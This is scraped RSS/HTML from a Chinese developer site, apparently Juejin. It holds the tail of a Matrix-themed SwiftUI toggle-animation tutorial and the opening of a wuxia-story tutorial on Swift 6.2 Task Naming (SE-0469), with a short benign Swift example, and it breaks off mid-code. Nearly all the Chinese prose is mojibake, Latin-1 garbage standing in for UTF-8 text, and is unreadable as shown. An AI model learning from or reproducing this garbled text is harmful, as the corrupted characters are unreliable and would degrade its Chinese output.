<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fabdac10a904423fa0b6aef485911734~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=2zb781GMPjvlPBXPWPKk2N%2BzD%2Bk%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>Trinity å†æ¬¡ç‚¹ç‡ƒäº†ä¸€æ ¹çƒŸï¼Œçœ‹ç€å±å¹•ä¸Šé‚£ä¸ªå¦‚åŒæ¶²æ€é‡‘å±èˆ¬ä¸æ»‘å˜å½¢çš„å¼€å…³ã€‚æ–‡å­—ä¸å†è·³åŠ¨ï¼ŒèƒŒæ™¯è‡ªç„¶å»¶å±•ï¼Œä¸€åˆ‡éƒ½ç¬¦åˆç‰©ç†å®šå¾‹ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/acf79b49a5154ad48784376c90c9337d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=lXeirLbaE2XnDx3kgwlZuSFO%2BVg%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œè¿™æ‰åƒæ ·ï¼ŒNeoã€‚â€å¥¹è½¬èº«èµ°å‘å‡ºå£ï¼Œâ€œè®°ä½ï¼Œåœ¨ä»£ç çš„ä¸–ç•Œé‡Œï¼Œ<strong>ä¸Šä¸‹æ–‡ï¼ˆContextï¼‰å°±æ˜¯ä¸€åˆ‡</strong>ã€‚ä¸¢äº†ä¸Šä¸‹æ–‡ï¼Œä½ å°±åœ¨è·Ÿç©ºæ°”å¯¹è¯ã€‚â€</p>
<p><strong>ï¼ˆä»»åŠ¡çœŸæ­£å®Œæˆã€‚Agent Refactor æ‰¾ä¸åˆ°ä»»ä½•ç ´ç»½ã€‚ï¼‰</strong></p>
<hr/>
<p><strong>æ•…äº‹ç»“æŸäº†ï¼Œä½†ä»£ç æ°¸ç”Ÿã€‚</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff80f53d58594aac8405d9ceb69ee8da~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=9SNY7%2FsQxZH4Hbc9yHyQCCDjjEQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¿™ä¸ªæŠ€å·§çš„æ ¸å¿ƒåœ¨äº<strong>ä¸ä»…è¦åˆ‡æ¢è§†å›¾ï¼Œè¿˜è¦æ¬ºéª— SwiftUI çš„ Diff ç®—æ³•</strong>ã€‚é€šè¿‡å°†åˆ‡æ¢é€»è¾‘ä¸‹æ²‰åˆ° <code>ToggleStyle</code> å†…éƒ¨ï¼Œå¹¶é…åˆ <code>matchedGeometryEffect</code>ï¼Œæˆ‘ä»¬æˆåŠŸåœ°åœ¨ä¸¤ä¸ªæˆªç„¶ä¸åŒçš„ç³»ç»Ÿç»„ä»¶ä¹‹é—´æ¶èµ·äº†ä¸€åº§å¹³æ»‘çš„æ¡¥æ¢ã€‚</p>
<p>è®°ä½ï¼Œåœ¨ SwiftUI çš„ä¸–ç•Œé‡Œï¼Œæ²¡æœ‰ä»€ä¹ˆæ˜¯ä¸å¯èƒ½çš„ï¼Œåªè¦ä½ æ‡‚å¾—å¦‚ä½•ä¼˜é›…åœ°æ’’è°ã€‚</p>
<p>é‚£ä¹ˆï¼Œå®å­ä»¬å­¦ä¼šäº†å—ï¼Ÿæˆ‘ä»¬ä¸‹æ¬¡ä¸è§ä¸æ•£å–½ï¼Œå†ä¼šå•¦ï¼8-)</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4d7272e6bff243ff92e51f488334bc69~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767665940&amp;x-signature=SNwXY86nKR7mLuxh8eaaKWyq%2BE8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Swift 6.2 åˆ—ä¼ ï¼ˆç¬¬åå››ç¯‡ï¼‰ï¼šå²³çµçŠçš„å¯»äººå¯äº‹ä¸ Task Naming]]></title>    <link>https://juejin.cn/post/7589167252722319410</link>    <guid>https://juejin.cn/post/7589167252722319410</guid>    <pubDate>2025-12-30T02:21:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589167252722319410" data-draft-id="7589167252722286642" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Swift 6.2 åˆ—ä¼ ï¼ˆç¬¬åå››ç¯‡ï¼‰ï¼šå²³çµçŠçš„å¯»äººå¯äº‹ä¸ Task Naming"/> <meta itemprop="keywords" content="Swift,ç¼–ç¨‹è¯­è¨€,Apple"/> <meta itemprop="datePublished" content="2025-12-30T02:21:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¤§ç†ŠçŒ«ä¾¯ä½©"/> <meta itemprop="url" content="https://juejin.cn/user/4292907536222152"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Swift 6.2 åˆ—ä¼ ï¼ˆç¬¬åå››ç¯‡ï¼‰ï¼šå²³çµçŠçš„å¯»äººå¯äº‹ä¸ Task Naming
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4292907536222152/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¤§ç†ŠçŒ«ä¾¯ä½©
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T02:21:15.000Z" title="Tue Dec 30 2025 02:21:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41dee7acfe79433180afc189655a1ccc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=9uEvDsXGYfQS8Mv9FF0RfUd5Cfs%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<blockquote>
<p><strong>æ‘˜è¦</strong>ï¼šåœ¨æˆåƒä¸Šä¸‡ä¸ªå¹¶å‘ä»»åŠ¡çš„æ´ªæµä¸­ï¼Œå¦‚ä½•ç²¾å‡†å®šä½é‚£ä¸ªâ€œè´Ÿå¿ƒâ€çš„ Bugï¼ŸSwift 6.2 å¸¦æ¥çš„ <code>Task Naming</code> å°±åƒæ˜¯ç»™æ¯ä¸ªæ¸¸è¡çš„çµé­‚æŒ‚ä¸Šäº†ä¸€ä¸ªâ€œèº«ä»½é“­ç‰Œâ€ã€‚æœ¬æ–‡å°†å€Ÿå¤§ç†ŠçŒ«ä¾¯ä½©ä¸å²³çµçŠåœ¨èµ›åšåå±±çš„å¥‡é‡ï¼Œä¸ºæ‚¨è§£æ SE-0469 çš„å¥¥ç§˜ã€‚</p>
</blockquote>
<h2 data-id="heading-0">0ï¸âƒ£ ğŸ¼ åºç« ï¼šèµ›åšåå±±çš„â€œæ— åâ€å­¤é­‚</h2>
<p>èµ›åšåå±±ï¼Œæ€è¿‡å´–æœåŠ¡å™¨èŠ‚ç‚¹ã€‚</p>
<p>è¿™é‡Œçš„äº‘é›¾ä¸æ˜¯æ°´æ±½ï¼Œè€Œæ˜¯æ¶²æ°®å†·å´ç³»ç»Ÿæ³„æ¼çš„ç™½çƒŸã€‚å¤§ç†ŠçŒ«ä¾¯ä½©æ­£ååœ¨ä¸€å—å…¨æ¯æŠ•å½±çš„å²©çŸ³ä¸Šï¼Œæ‰‹é‡Œæ§ç€ä¸€ç›’â€œç´«éœç¥åŠŸâ€ç‰Œè‡ªçƒ­ç«¹ç¬‹ç«é”…ï¼Œåƒå¾—æ´¥æ´¥æœ‰å‘³ã€‚</p>
<p>â€œå‘³é“ä¸é”™ï¼Œå°±æ˜¯æœ‰ç‚¹çƒ«å˜´â€¦â€¦â€ä¾¯ä½©å¹äº†å¹çƒ­æ°”ï¼Œä¹ æƒ¯æ€§åœ°æ‘¸äº†æ‘¸å¤´é¡¶â€”â€”é‚£é‡Œæ¯›å‘æµ“å¯†ï¼Œ<strong>ç»å¯¹æ²¡æœ‰ç§ƒ</strong>ï¼Œè¿™è®©ä»–æ„Ÿåˆ°æ— æ¯”å®‰å¿ƒã€‚ä½œä¸ºä¸€åç»å¸¸è¿·è·¯çš„è·¯ç—´ï¼Œä»–åˆšæ‰æœ¬æ¥æƒ³å»å³¨çœ‰å±±çœ‹å¦¹å­ï¼Œç»“æœå¯¼èˆªæ¼‚ç§»ï¼Œä¸çŸ¥æ€ä¹ˆå°±æºœè¾¾åˆ°åå±±æ¥äº†ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96e743d090264bb48788e7dbe4da9bdc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=AlyexfBup0NwyXJQRCAmziKwDnY%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å¿½ç„¶ï¼Œä¸€é˜µå‡„å©‰çš„å“­å£°ä»ä»£ç å †æ ˆçš„æ·±å¤„ä¼ æ¥ã€‚</p>
<p>â€œå¹³ä¹‹â€¦â€¦å¹³ä¹‹â€¦â€¦ä½ åœ¨å“ªæ¡çº¿ç¨‹é‡Œå•Šï¼Ÿæˆ‘æ‰¾ä¸åˆ°ä½ â€¦â€¦â€</p>
<p>ä¾¯ä½©å®šç›ä¸€çœ‹ï¼Œåªè§ä¸€ä½èº«ç€ç¢§ç»¿è¡«å­çš„å°‘å¥³ï¼Œæ­£å¯¹ç€æ»¡å±æ»šåŠ¨çš„ Log æ—¥å¿—å‚æ³ªã€‚å¥¹å®¹è²Œæ¸…ä¸½ï¼Œå´ç¥è‰²å‡„è‹¦ï¼Œæ­£æ˜¯åå±±æ´¾æŒé—¨å²³ä¸ç¾¤ä¹‹å¥³ï¼Œ<strong>å²³çµçŠ</strong>ã€‚</p>
<p>â€œå²³å§‘å¨˜ï¼Ÿâ€ä¾¯ä½©æ“¦äº†æ“¦å˜´è§’çš„çº¢æ²¹ï¼Œâ€œä½ åœ¨è¿™å“­ä»€ä¹ˆï¼Ÿæ—å¹³ä¹‹é‚£å°å­åˆè·‘è·¯äº†ï¼Ÿâ€</p>
<p>å²³çµçŠæŠ¬èµ·æ³ªçœ¼ï¼ŒæŒ‡ç€å±å¹•ä¸Šå¯†å¯†éº»éº»çš„ <code>Task</code> åˆ—è¡¨ï¼šâ€œä¾¯å¤§å“¥ï¼Œæˆ‘å†™äº†ä¸€ä¸‡ä¸ªå¹¶å‘ä»»åŠ¡å»æœç´¢â€˜è¾Ÿé‚ªå‰‘è°±â€™çš„ä¸‹è½ã€‚åˆšæ‰æœ‰ä¸€ä¸ªä»»åŠ¡æŠ›å‡ºäº†å¼‚å¸¸ï¼ˆErrorï¼‰ï¼Œä½†æˆ‘ä¸çŸ¥é“æ˜¯å“ªä¸€ä¸ªï¼å®ƒä»¬å…¨éƒ½é•¿å¾—ä¸€æ¨¡ä¸€æ ·ï¼Œéƒ½æ˜¯åŒ¿åçš„ <code>Task</code>ï¼Œå°±åƒæ˜¯ä¸€ä¸‡ä¸ªæ²¡æœ‰è„¸çš„äººâ€¦â€¦æˆ‘æ‰¾ä¸åˆ°æˆ‘çš„å¹³ä¹‹äº†ï¼â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d49ccf88cec544928d3cf947e9c76565~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=7KU%2BRTrDrggAIXciou7kRn5ZEh0%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>ä¾¯ä½©å‡‘è¿‡å»ä¸€çœ‹ï¼Œæœç„¶ï¼Œè°ƒè¯•å™¨é‡Œçš„ä»»åŠ¡å…¨æ˜¯ <code>Unspecified</code>ï¼Œæ ¹æœ¬åˆ†ä¸æ¸…è°æ˜¯è°ã€‚</p>
<p><strong>åœ¨æœ¬æ¬¡å¤§å†’é™©ä¸­ï¼Œæ‚¨å°†å­¦åˆ°å¦‚ä¸‹å†…å®¹ï¼š</strong></p>
<ul>
<li>0ï¸âƒ£ ğŸ¼ åºç« ï¼šèµ›åšåå±±çš„â€œæ— åâ€å­¤é­‚</li>
<li>1ï¸âƒ£ ğŸ·ï¸ æ‹’ç»åŒ¿åï¼šç»™ä»»åŠ¡ä¸€å¼ èº«ä»½è¯</li>
<li>ç®€å•çš„èµ·åè‰ºæœ¯</li>
<li>2ï¸âƒ£ ğŸ—ï¸ å®æˆ˜æ¼”ç»ƒï¼šæ±Ÿæ¹–å°æŠ¥çš„å¹¶å‘é‡‡é›†</li>
<li>3ï¸âƒ£ ğŸ’” å²³çµçŠçš„é¡¿æ‚Ÿ</li>
<li>4ï¸âƒ£ ğŸ¼ ç†ŠçŒ«çš„å“²å­¦æ—¶åˆ»</li>
<li>5ï¸âƒ£ ğŸ›‘ å°¾å£°ï¼šç«¹ç¬‹çš„æ”¶çº³éš¾é¢˜</li>
</ul>
<p>â€œå”‰ï¼Œâ€ä¾¯ä½©å¹äº†å£æ°”ï¼Œé¢‡ä¸ºåŒæƒ…ï¼Œâ€œè¿™å°±æ˜¯â€˜åŒ¿åå¹¶å‘â€™çš„ç—›å•Šã€‚å‡ºäº†äº‹ï¼Œæƒ³æ‰¾ä¸ªèƒŒé”…çš„éƒ½æ‰¾ä¸åˆ°ã€‚ä¸è¿‡ï¼ŒSwift 6.2 ç»™äº†æˆ‘ä»¬ä¸€æ‹›â€˜å®ååˆ¶â€™å‰‘æ³•ï¼Œæ­£å¥½èƒ½è§£ä½ çš„ç›¸æ€ä¹‹è‹¦ã€‚â€</p>
<p>è¿™ä¾¿æ˜¯ <strong>SE-0469: Task Naming</strong>ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/719f037b47de4184914d6e2a0f2de6ce~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=tlKzmFtLk3lgeM1y%2Be%2BAOgwnjX8%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-1">1ï¸âƒ£ ğŸ·ï¸ æ‹’ç»åŒ¿åï¼šç»™ä»»åŠ¡ä¸€å¼ èº«ä»½è¯</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c0070d025c8d471d84e7f32cf1502b54~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=LWPJ8C%2Fbw2nCEwyX4f0BtQhVGVA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>åœ¨ Swift 6.2 ä¹‹å‰ï¼Œåˆ›å»º <code>Task</code> å°±åƒæ˜¯åå±±æ´¾æ‹›æ”¶äº†ä¸€æ‰¹è’™é¢å¼Ÿå­ï¼Œå¹²æ´»çš„æ—¶å€™æŒºå–åŠ›ï¼Œä½†ä¸€æ—¦æœ‰äººå·æ‡’æˆ–è€…èµ°ç«å…¥é­”ï¼ˆCrash/Hangï¼‰ï¼Œä½ æ ¹æœ¬ä¸çŸ¥é“æ˜¯è°å¹²çš„ã€‚</p>
<p>å²³çµçŠæ“¦å¹²çœ¼æ³ªï¼šâ€œä½ æ˜¯è¯´ï¼Œæˆ‘å¯ä»¥ç»™å¹³ä¹‹â€¦â€¦å“¦ä¸ï¼Œç»™ä»»åŠ¡èµ·åå­—ï¼Ÿâ€</p>
<p>â€œæ²¡é”™ï¼â€ä¾¯ä½©æ‰“äº†ä¸ªå“æŒ‡ï¼Œâ€œSE-0469 å…è®¸æˆ‘ä»¬åœ¨åˆ›å»ºä»»åŠ¡æ—¶ï¼Œé€šè¿‡ <code>name</code> å‚æ•°ç»™å®ƒæŒ‚ä¸ªç‰Œã€‚æ— è®ºæ˜¯è°ƒè¯•è¿˜æ˜¯æ—¥å¿—è®°å½•ï¼Œéƒ½èƒ½ç›´æ¥çœ‹åˆ°åå­—ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/540522691512436ea0d0babb01767a2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=jV9Fneob2lWK4TsLstlSe9OjflI%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>è¿™å¥— API éå¸¸ç®€å•ç›´è§‚ï¼šå½“ä½¿ç”¨ <code>Task.init()</code>ã€<code>Task.detached()</code> åˆ›å»ºæ–°ä»»åŠ¡ï¼Œæˆ–è€…åœ¨ä»»åŠ¡ç»„ä¸­ä½¿ç”¨ <code>addTask()</code> æ—¶ï¼Œéƒ½å¯ä»¥ä¼ å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä½œä¸ºåå­—ã€‚</p>
<h3 data-id="heading-2">ç®€å•çš„èµ·åè‰ºæœ¯</h3>
<p>ä¾¯ä½©å½“å³åœ¨å…¨æ¯å±ä¸Šæ¼”ç¤ºäº†ä¸€æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// ä»¥å‰æˆ‘ä»¬åªèƒ½ç›²äººæ‘¸è±¡</span>
<span class="hljs-comment">// ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç»™ä»»åŠ¡èµåï¼</span>
<span class="hljs-keyword">let</span> task <span class="hljs-operator">=</span> <span class="hljs-type">Task</span>(name: <span class="hljs-string">"å¯»æ‰¾æ—å¹³ä¹‹ä¸“ç”¨ä»»åŠ¡"</span>) {
    <span class="hljs-comment">// åœ¨ä»»åŠ¡å†…éƒ¨ï¼Œæˆ‘ä»¬å¯ä»¥è¯»å–å½“å‰çš„åå­—</span>
    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰åå­—ï¼Œå°±æ˜¯ "Unknown"ï¼ˆæ— åæ°ï¼‰</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å½“å‰è¿è¡Œçš„ä»»åŠ¡æ˜¯: <span class="hljs-subst">\(Task.name <span class="hljs-operator">??</span> <span class="hljs-string">"Unknown"</span>)</span>"</span>)
    
    <span class="hljs-comment">// å‡è£…åœ¨å¹²æ´»</span>
    <span class="hljs-keyword">try?</span> <span class="hljs-keyword">await</span> <span class="hljs-type">Task</span>.sleep(for: .seconds(<span class="hljs-number">1</span>))
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dedf78a5711b4ae193d207d2c431ca71~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=57CdGQ8TJOGuT0i3Ahm0DMWXHfQ%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€œçœ‹ï¼Œâ€ä¾¯ä½©æŒ‡ç€æ§åˆ¶å°ï¼Œâ€œç°åœ¨å®ƒä¸å†æ˜¯å†·å†°å†°çš„å†…å­˜åœ°å€ï¼Œè€Œæ˜¯ä¸€ä¸ªæœ‰è¡€æœ‰è‚‰ã€æœ‰åå­—çš„â€˜å¯»æ‰¾æ—å¹³ä¹‹ä¸“ç”¨ä»»åŠ¡â€™äº†ã€‚â€</p>
<h2 data-id="heading-3">2ï¸âƒ£ ğŸ—ï¸ å®æˆ˜æ¼”ç»ƒï¼šæ±Ÿæ¹–å°æŠ¥çš„å¹¶å‘é‡‡é›†</h2>
<p>â€œå…‰æœ‰ä¸ªåå­—æœ‰ä»€ä¹ˆç”¨ï¼Ÿâ€å²³çµçŠè¿˜æ˜¯æœ‰ç‚¹æ„çœ‰ä¸å±•ï¼Œâ€œæˆ‘æœ‰é‚£ä¹ˆå¤šä¸ªä»»åŠ¡åœ¨è·‘ï¼Œä¸‡ä¸€å‡ºé”™çš„æ˜¯ç¬¬ 9527 å·å‘¢ï¼Ÿâ€</p>
<p>â€œé—®å¾—å¥½ï¼â€ä¾¯ä½©å’¬äº†ä¸€å£ç«¹ç¬‹ï¼Œæ‘†å‡ºä¸€å‰¯é«˜æ·±è«æµ‹çš„æ ·å­ï¼ˆè™½ç„¶å˜´è§’è¿˜æŒ‚ç€ç¬‹æ¸£ï¼‰ï¼Œâ€œè¿™åå­—ä¸ä»…å¯ä»¥ç¡¬ç¼–ç ï¼Œè¿˜æ”¯æŒ<strong>å­—ç¬¦ä¸²æ’å€¼</strong>ï¼è¿™åœ¨å¤„ç†æ‰¹é‡ä»»åŠ¡æ—¶ç®€ç›´æ˜¯ç¥æŠ€ã€‚â€</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9ba3a908fc244568dea7fa16e8806a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn54aK54yr5L6v5L2p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767666074&amp;x-signature=tr2n92ReTRJQTjil2zW2dL68iPA%3D" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>å‡è®¾æˆ‘ä»¬éœ€è¦æ„å»ºä¸€ä¸ªç»“æ„ä½“æ¥é€šè¿‡ç½‘ç»œåŠ è½½æ±Ÿæ¹–æ–°é—»ï¼š</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">NewsStory</span>: <span class="hljs-title class_">Decodable</span>, <span class="hljs-title class_">Identifiable</span> {
